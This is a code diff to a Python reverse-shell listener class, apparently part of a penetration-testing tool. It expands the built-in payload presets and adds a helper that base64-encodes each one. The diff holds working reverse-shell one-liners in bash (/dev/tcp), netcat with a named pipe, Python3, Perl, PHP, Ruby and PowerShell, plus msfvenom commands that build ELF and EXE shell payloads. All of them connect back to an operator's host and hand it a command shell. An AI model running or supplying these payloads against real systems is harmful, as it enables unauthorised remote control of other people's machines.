@@ -2417,11 +2417,23 @@ class TCPListener:
 	def payloads(self, interface_filter=None, target_os='both'):
 		pairs = Interfaces().pairs
 		name_of_ip = {ip: name for name, ip in pairs}
-		presets = [
-			"(bash >& /dev/tcp/{}/{} 0>&1) &",
-			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
-			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
-		]
+		presets = {
+			"bash": "(bash >& /dev/tcp/{}/{} 0>&1) &",
+			"nc_fifo": "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
+			"python3": '(python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\') >/dev/null 2>&1 &',
+			"perl": '(perl -e \'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");}};\') >/dev/null 2>&1 &',
+			"php": '(php -r \'$sock=fsockopen("{}",{});exec("/bin/sh <&3 >&3 2>&3");\') >/dev/null 2>&1 &',
+			"ruby": '(ruby -rsocket -e \'c=TCPSocket.new("{}",{});$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec "/bin/sh"\') >/dev/null 2>&1 &',
+			"msfvenom_elf": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={} LPORT={} -f elf -o shell.elf",
+			"msfvenom_exe": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -f exe -o shell.exe",
+			"powershell": '$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()', # Taken from revshells.com
+		}
+
+		def oneliner(name, shell, ip, port):
+			# The target gets the payload base64 encoded, so quoting survives whatever
+			# mangles it on the way in.
+			payload = base64.b64encode(presets[name].format(ip, port).encode()).decode()
+			return f"printf {payload}|base64 -d|{shell}"
 
 		output = [str(paint(self).white_MAGENTA)]
 		output.append("")
@@ -2447,13 +2459,18 @@ class TCPListener:
 			output.extend((f'➤  {iface_name} → {str(paint(ip).cyan)}:{str(paint(port).orange)}', ''))
 			blocks = []
 			if target_os in ('linux', 'both'):
-				blocks.append(("Bash TCP",
-					f"printf {base64.b64encode(presets[0].format(ip, port).encode()).decode()}|base64 -d|bash"))
-				blocks.append(("Netcat + named pipe",
-					f"printf {base64.b64encode(presets[1].format(ip, port).encode()).decode()}|base64 -d|sh"))
+				blocks.append(("Bash TCP", oneliner("bash", "bash", ip, port)))
+				blocks.append(("Netcat + named pipe", oneliner("nc_fifo", "sh", ip, port)))
+				blocks.append(("Python3", oneliner("python3", "sh", ip, port)))
+				blocks.append(("Perl", oneliner("perl", "sh", ip, port)))
+				blocks.append(("PHP", oneliner("php", "sh", ip, port)))
+				blocks.append(("Ruby", oneliner("ruby", "sh", ip, port)))
+				# msfvenom runs on this machine, not on the target, so it is printed as is.
+				blocks.append(("Msfvenom ELF", presets["msfvenom_elf"].format(ip, port)))
 			if target_os in ('windows', 'both'):
 				blocks.append(("Powershell",
-					"cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, port).encode("utf-16le")).decode()))
+					"cmd /c powershell -e " + base64.b64encode(presets["powershell"].format(ip, port).encode("utf-16le")).decode()))
+				blocks.append(("Msfvenom EXE", presets["msfvenom_exe"].format(ip, port)))
 			blocks.append(("Metasploit", "\n".join((
 				"set PAYLOAD generic/shell_reverse_tcp",
 				f"set LHOST {ip}",
